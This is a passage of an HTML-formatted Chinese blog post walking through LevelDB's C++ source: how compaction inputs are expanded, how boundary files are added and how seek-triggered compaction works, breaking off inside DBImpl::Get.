class="keyword">int</span>(expanded1.<span class="built_in">size</span>()), <span class="keyword">long</span>(expanded0_size), <span class="keyword">long</span>(inputs1_size));</span><br><span class="line">        smallest = new_start;</span><br><span class="line">        largest = new_limit;</span><br><span class="line">        c-&gt;inputs_[<span class="number">0</span>] = expanded0;</span><br><span class="line">        c-&gt;inputs_[<span class="number">1</span>] = expanded1;</span><br><span class="line">        GetRange2(c-&gt;inputs_[<span class="number">0</span>], c-&gt;inputs_[<span class="number">1</span>], &amp;all_start, &amp;all_limit);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute the set of grandparent files that overlap this compaction</span></span><br><span class="line">  <span class="comment">// (parent == level+1; grandparent == level+2)</span></span><br><span class="line">  <span class="keyword">if</span> (level + <span class="number">2</span> &lt; <span class="built_in">config</span>::kNumLevels) &#123;</span><br><span class="line">    current_-&gt;GetOverlappingInputs(level + <span class="number">2</span>, &amp;all_start, &amp;all_limit,</span><br><span class="line">                                   &amp;c-&gt;grandparents_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update the place where we will do the next compaction for this level.</span></span><br><span class="line">  <span class="comment">// We update this immediately instead of waiting for the VersionEdit</span></span><br><span class="line">  <span class="comment">// to be applied so that if the compaction fails, we will try a different</span></span><br><span class="line">  <span class="comment">// key range next time.</span></span><br><span class="line">  compact_pointer_[level] = largest.Encode().ToString();</span><br><span class="line">  c-&gt;edit_.SetCompactPointer(level, largest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h4><p>核心在着几行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 获取当前level n的range</span></span><br><span class="line">GetRange(c-&gt;inputs_[<span class="number">0</span>], &amp;smallest, &amp;largest);</span><br><span class="line"> <span class="comment">// 获取level n+1中与 level n的range重叠的sstable，将这些sstable存放在c-&gt;inputs_[1]中</span></span><br><span class="line">current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;smallest, &amp;largest,</span><br><span class="line">                               &amp;c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get entire range covered by compaction</span></span><br><span class="line">InternalKey all_start, all_limit;</span><br><span class="line"> <span class="comment">// 计算leveln level n+1的range</span></span><br><span class="line">GetRange2(c-&gt;inputs_[<span class="number">0</span>], c-&gt;inputs_[<span class="number">1</span>], &amp;all_start, &amp;all_limit);</span><br></pre></td></tr></table></figure><h4 id="level-n新SStable的加入"><a href="#level-n新SStable的加入" class="headerlink" title="level n新SStable的加入"></a>level n新SStable的加入</h4><p>那下面还有一大段是做什么用的？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// See if we can grow the number of inputs in "level" without</span></span><br><span class="line"><span class="comment">// changing the number of "level+1" files we pick up.</span></span><br><span class="line"><span class="keyword">if</span> (!c-&gt;inputs_[<span class="number">1</span>].empty()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; expanded0;</span><br><span class="line">    current_-&gt;GetOverlappingInputs(level, &amp;all_start, &amp;all_limit, &amp;expanded0);</span><br><span class="line">    AddBoundaryInputs(icmp_, current_-&gt;files_[level], &amp;expanded0);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> inputs0_size = TotalFileSize(c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> inputs1_size = TotalFileSize(c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> expanded0_size = TotalFileSize(expanded0);</span><br><span class="line">    <span class="keyword">if</span> (expanded0.<span class="built_in">size</span>() &gt; c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp;</span><br><span class="line">        inputs1_size + expanded0_size &lt;</span><br><span class="line">        ExpandedCompactionByteSizeLimit(options_)) &#123;</span><br><span class="line">        InternalKey new_start, new_limit;</span><br><span class="line">        GetRange(expanded0, &amp;new_start, &amp;new_limit);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; expanded1;</span><br><span class="line">        current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;new_start, &amp;new_limit,</span><br><span class="line">                                       &amp;expanded1);</span><br><span class="line">        <span class="keyword">if</span> (expanded1.<span class="built_in">size</span>() == c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()) &#123;</span><br><span class="line">            Log(options_-&gt;info_log,</span><br><span class="line">                <span class="string">"Expanding@%d %d+%d (%ld+%ld bytes) to %d+%d (%ld+%ld bytes)\n"</span>,</span><br><span class="line">                level, <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>()), <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()),</span><br><span class="line">                <span class="keyword">long</span>(inputs0_size), <span class="keyword">long</span>(inputs1_size), <span class="keyword">int</span>(expanded0.<span class="built_in">size</span>()),</span><br><span class="line">                <span class="keyword">int</span>(expanded1.<span class="built_in">size</span>()), <span class="keyword">long</span>(expanded0_size), <span class="keyword">long</span>(inputs1_size));</span><br><span class="line">            smallest = new_start;</span><br><span class="line">            largest = new_limit;</span><br><span class="line">            c-&gt;inputs_[<span class="number">0</span>] = expanded0;</span><br><span class="line">            c-&gt;inputs_[<span class="number">1</span>] = expanded1;</span><br><span class="line">            GetRange2(c-&gt;inputs_[<span class="number">0</span>], c-&gt;inputs_[<span class="number">1</span>], &amp;all_start, &amp;all_limit);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的意思是，在选中level n+1层的sstable后，可能还可以加入一些level n的sstable。举个例子：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LWxldmVs" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-level">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-level<i class="fa fa-external-link"></i></span> n重新加入一些sstable.png)</p><p>假设现在在level n选择的是8-12这个sstable，则在level n+1 可以选择8-9，10-16着连个sstable。 这一切做完后，发现在level n中存在13-15这个sstable，加入13-15并不影响level n+1 sstable的选择。</p><p>上面那段代码就是做这个工作。举个不会加入新sstable的例子：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第<i class="fa fa-external-link"></i></span> 16 页 (1).png)</p><p>在这样的情况下，13-18的重新加入，level n+1 需要重新加入17-20，所以不应该加入13-18.</p><p>但是再看下一个例子：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第<i class="fa fa-external-link"></i></span> 17 页.png)</p><p>这个例子中，虽然新加入level 13-18，扩大了inputs_的范围，但是由于并没有造成level n+1的sstable重新选择，所以依然可以加入13-18.</p><p>ok，例子说了好几个，正式看代码。</p><ol><li>计算如果要在level n要重新加入sstable，那加入后的第level n层的compaction sstable的总大小为多少（即expanded0_size)</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">current_-&gt;GetOverlappingInputs(level, &amp;all_start, &amp;all_limit, &amp;expanded0);</span><br><span class="line">AddBoundaryInputs(icmp_, current_-&gt;files_[level], &amp;expanded0);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int64_t</span> inputs0_size = TotalFileSize(c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int64_t</span> inputs1_size = TotalFileSize(c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int64_t</span> expanded0_size = TotalFileSize(expanded0);</span><br></pre></td></tr></table></figure><ol start="2"><li>如果新加入后，level n和level n+1的总size小于一次compaction的总size，则考虑加入。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expanded0.<span class="built_in">size</span>() &gt; c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp;</span><br><span class="line">      inputs1_size + expanded0_size &lt;</span><br><span class="line">          ExpandedCompactionByteSizeLimit(options_)) &#123;</span><br><span class="line">    InternalKey new_start, new_limit;</span><br><span class="line">    GetRange(expanded0, &amp;new_start, &amp;new_limit);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; expanded1;</span><br><span class="line">    current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;new_start, &amp;new_limit,</span><br><span class="line">                                   &amp;expanded1);</span><br></pre></td></tr></table></figure><p>一次compaction的总size：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Maximum number of bytes in all compacted files.  We avoid expanding</span></span><br><span class="line"><span class="comment">// the lower level file set of a compaction if it would make the</span></span><br><span class="line"><span class="comment">// total compaction cover more than this many bytes.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int64_t</span> <span class="title">ExpandedCompactionByteSizeLimit</span><span class="params">(<span class="keyword">const</span> Options* options)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">25</span> * TargetFileSize(options);<span class="comment">// 默认是50M</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">TargetFileSize</span><span class="params">(<span class="keyword">const</span> Options* options)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> options-&gt;max_file_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Leveldb will write up to this amount of bytes to a file before</span></span><br><span class="line"><span class="comment">// switching to a new one.</span></span><br><span class="line"><span class="comment">// Most clients should leave this parameter alone.  However if your</span></span><br><span class="line"><span class="comment">// filesystem is more efficient with larger files, you could</span></span><br><span class="line"><span class="comment">// consider increasing the value.  The downside will be longer</span></span><br><span class="line"><span class="comment">// compactions and hence longer latency/performance hiccups.</span></span><br><span class="line"><span class="comment">// Another reason to increase this parameter might be when you are</span></span><br><span class="line"><span class="comment">// initially populating a large database.</span></span><br><span class="line"><span class="keyword">size_t</span> max_file_size = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>在level n中加入新sstable，但没有引起level n+1的sstable选择，则加入这个新sstable。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expanded1.<span class="built_in">size</span>() == c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()) &#123;</span><br><span class="line">    Log(options_-&gt;info_log,</span><br><span class="line">        <span class="string">"Expanding@%d %d+%d (%ld+%ld bytes) to %d+%d (%ld+%ld bytes)\n"</span>,</span><br><span class="line">        level, <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>()), <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()),</span><br><span class="line">        <span class="keyword">long</span>(inputs0_size), <span class="keyword">long</span>(inputs1_size), <span class="keyword">int</span>(expanded0.<span class="built_in">size</span>()),</span><br><span class="line">        <span class="keyword">int</span>(expanded1.<span class="built_in">size</span>()), <span class="keyword">long</span>(expanded0_size), <span class="keyword">long</span>(inputs1_size));</span><br><span class="line">    smallest = new_start;</span><br><span class="line">    largest = new_limit;</span><br><span class="line">    c-&gt;inputs_[<span class="number">0</span>] = expanded0;</span><br><span class="line">    c-&gt;inputs_[<span class="number">1</span>] = expanded1;</span><br><span class="line">    GetRange2(c-&gt;inputs_[<span class="number">0</span>], c-&gt;inputs_[<span class="number">1</span>], &amp;all_start, &amp;all_limit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-记录下一轮的压缩起始文件"><a href="#3-记录下一轮的压缩起始文件" class="headerlink" title="3. 记录下一轮的压缩起始文件"></a>3. 记录下一轮的压缩起始文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Update the place where we will do the next compaction for this level.</span></span><br><span class="line"><span class="comment">// We update this immediately instead of waiting for the VersionEdit</span></span><br><span class="line"><span class="comment">// to be applied so that if the compaction fails, we will try a different</span></span><br><span class="line"><span class="comment">// key range next time.</span></span><br><span class="line">compact_pointer_[level] = largest.Encode().ToString();</span><br><span class="line">c-&gt;edit_.SetCompactPointer(level, largest);</span><br></pre></td></tr></table></figure><h4 id="4-AddBoundaryInputs"><a href="#4-AddBoundaryInputs" class="headerlink" title="4. AddBoundaryInputs"></a>4. AddBoundaryInputs</h4><p>在前面的介绍中，我曾说过，除了level0， 其余level中 inputs数组的inputs[0]总是先只选择一个文件，然后通过<code>VersionSet::SetupOtherInputs</code>，确定inputs_[1],  当inputs_[1]确定后，会回退到input_[0]，尝试增加input_[0]的文件。其实除了这里会增加input[0]的选择外，还有一处可能增加Inputs[0]的选择。那就是AddBoundaryInputs函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionSet::SetupOtherInputs</span><span class="params">(Compaction* c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> level = c-&gt;level();</span><br><span class="line">  InternalKey smallest, largest;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// !! 这里</span></span><br><span class="line">  AddBoundaryInputs(icmp_, current_-&gt;files_[level], &amp;c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">  GetRange(c-&gt;inputs_[<span class="number">0</span>], &amp;smallest, &amp;largest);</span><br><span class="line"></span><br><span class="line">  current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;smallest, &amp;largest,</span><br><span class="line">                                 &amp;c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==AddBoundaryInputs==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Extracts the largest file b1 from |compaction_files| and then searches for a</span></span><br><span class="line"><span class="comment">// b2 in |level_files| for which user_key(u1) = user_key(l2). If it finds such a</span></span><br><span class="line"><span class="comment">// file b2 (known as a boundary file) it adds it to |compaction_files| and then</span></span><br><span class="line"><span class="comment">// searches again using this new upper bound.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If there are two blocks, b1=(l1, u1) and b2=(l2, u2) and</span></span><br><span class="line"><span class="comment">// user_key(u1) = user_key(l2), and if we compact b1 but not b2 then a</span></span><br><span class="line"><span class="comment">// subsequent get operation will yield an incorrect result because it will</span></span><br><span class="line"><span class="comment">// return the record from b2 in level i rather than from b1 because it searches</span></span><br><span class="line"><span class="comment">// level by level for records matching the supplied user key.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// parameters:</span></span><br><span class="line"><span class="comment">//   in     level_files:      List of files to search for boundary files.</span></span><br><span class="line"><span class="comment">//   in/out compaction_files: List of files to extend by adding boundary files.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddBoundaryInputs</span><span class="params">(<span class="keyword">const</span> InternalKeyComparator&amp; icmp,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; level_files,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;* compaction_files)</span> </span>&#123;</span><br><span class="line">  InternalKey largest_key;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Quick return if compaction_files is empty.</span></span><br><span class="line">  <span class="keyword">if</span> (!FindLargestKey(icmp, *compaction_files, &amp;largest_key)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> continue_searching = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (continue_searching) &#123;</span><br><span class="line">    FileMetaData* smallest_boundary_file =</span><br><span class="line">        FindSmallestBoundaryFile(icmp, level_files, largest_key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If a boundary file was found advance largest_key, otherwise we're done.</span></span><br><span class="line">    <span class="keyword">if</span> (smallest_boundary_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      compaction_files-&gt;push_back(smallest_boundary_file);</span><br><span class="line">      largest_key = smallest_boundary_file-&gt;largest;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      continue_searching = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在AddBoundaryInputs调用前，我们已经确定了inputs[0], 如果不考虑level0的话，对于其他level，inputs[0]为一个sstable。这个sstable存在一个key range[low,high], 我们都知道 sstable内部存的key是InternalKey, InternalKey内部封装了user key。如下图：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LW1lbXRhYmxl5o+S5YWl5LiA5LiqZW50cnk=" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry<i class="fa fa-external-link"></i></span> (1).png)</p><p>因为只要internel key不相同，那么就可认为key是不重叠的。也就是说只要(key, sequence number,type)三个任一个不同，就可以认为key是不同。 那现在可能就存在这样一个情况， 相邻两个sstable的user key相同。如下图表示：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LUFkZEJvdW5kYXJ5SW5wdXRz" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-AddBoundaryInputs">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-AddBoundaryInputs<i class="fa fa-external-link"></i></span> (1).png)</p><p>sstable 1中的上届(upper)的user key 和 sstable 2的下届(lower)的user key相同，都为key2. 假设我们当前inputs[0]就是sstable 1。 那么AddBoundaryInputs函数的作用就是将sstable 2添加到inputs[0]中。 当然这是一个递归的过程，加完sstable 2，可能sstable 3的下届user key又和sstable 2的上届相同，所以继续添加。</p><p>为什么要这样加？因为若是不添加，sstable 1经过compaction陷入下层，而sstable 2还在上层。那么下一次Get操作时，leveldb将由上往下search，这样找到的key在sstable 2，而sstable 2中的key不是最新的，这显然是不对的。</p><h3 id="2-Seek-Compaction"><a href="#2-Seek-Compaction" class="headerlink" title="2. Seek Compaction"></a>2. Seek Compaction</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PickCompaction函数中</span></span><br><span class="line">level = current_-&gt;file_to_compact_level_;</span><br><span class="line">c = <span class="keyword">new</span> Compaction(options_, level);</span><br><span class="line">c-&gt;inputs_[<span class="number">0</span>].push_back(current_-&gt;file_to_compact_);</span><br></pre></td></tr></table></figure><p>根据<code>file_to_compact_</code>指针和<code>file_to_compact_level_</code>即可得到 ==一个输入源文件==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Next file to compact based on seek stats.</span></span><br><span class="line">FileMetaData* file_to_compact_;</span><br><span class="line"><span class="keyword">int</span> file_to_compact_level_;</span><br></pre></td></tr></table></figure><h4 id="1-什么时候触发一次seek-compaction？"><a href="#1-什么时候触发一次seek-compaction？" class="headerlink" title="1. 什么时候触发一次seek compaction？"></a>1. 什么时候触发一次seek compaction？</h4><p>我们从<code>file_to_compact_</code>反追踪，可以发现 UpdateStats 函数中对file_to_compact_进行了赋值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Version::UpdateStats</span><span class="params">(<span class="keyword">const</span> GetStats&amp; stats)</span> </span>&#123;</span><br><span class="line">  FileMetaData* f = stats.seek_file;</span><br><span class="line">  <span class="keyword">if</span> (f != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    f-&gt;allowed_seeks--;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;allowed_seeks &lt;= <span class="number">0</span> &amp;&amp; file_to_compact_ == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      file_to_compact_ = f;</span><br><span class="line">      file_to_compact_level_ = stats.seek_file_level;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里可以看出，当一个文件的allowed_seeks&lt;=0时，就可以对这个file进行compaction。</p><h4 id="2-allowed-seeks–的时机-1-amp-DBImpl-Get的简单分析"><a href="#2-allowed-seeks–的时机-1-amp-DBImpl-Get的简单分析" class="headerlink" title="2. allowed_seeks–的时机 (1) &amp; DBImpl::Get的简单分析"></a>2. allowed_seeks–的时机 (1) &amp; DBImpl::Get的简单分析</h4><p>继续反追踪 ，什么时候调用UpdateStats? <strong>在DBImpl::Get函数中</strong></p><p>==DBImpl::Get==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::Get</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="built_in">std</span>::<span class="built_in">string</span>* value)</span> </span>&#123;</span><br><span class="line">  Status s;</span><br><span class="line">  <span class="function">MutexLock <span class="title">l</span><span class="params">(&amp;mutex_)</span></span>;</span><br><span class="line">  SequenceNumber snapshot;</span><br><span class="line">  <span class="keyword">if</span> (options.snapshot != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    snapshot =</span><br><span class="line">        <span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> SnapshotImpl*&gt;(options.snapshot)-&gt;sequence_number();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    snapshot = versions_-&gt;LastSequence();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  MemTable* mem = mem_;</span><br><span class="line">  MemTable* imm = imm_;</span><br><span class="line">  Version* current = versions_-&gt;current();</span><br><span class="line">  mem-&gt;Ref();</span><br><span class="line">  <span class="keyword">if</span> (imm != <span class="literal">nullptr</span>) imm-&gt;Ref();</span><br><span class="line">  current-&gt;Ref();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> have_stat_update = <span class="literal">false</span>;</span><br><span class="line">  Version::GetStats stats;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Unlock while reading from files and memtables</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_.Unlock();</span><br><span class="line">    <span class="comment">// First look in the memtable, then in the immutable memtable (if any).</span></span><br><span class="line">    <span class="function">LookupKey <span class="title">lkey</span><span class="params">(key, snapshot)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (mem-&gt;Get(lkey, value, &amp;s)) &#123; <span class="comment">// 1.首先在mem中</span></span><br><span class="line">      <span class="comment">// Done</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (imm != <span class="literal">nullptr</span> &amp;&amp; imm-&gt;Get(lkey, value, &amp;s)) &#123;<span class="comment">// 2.然后在imm中</span></span><br><span class="line">      <span 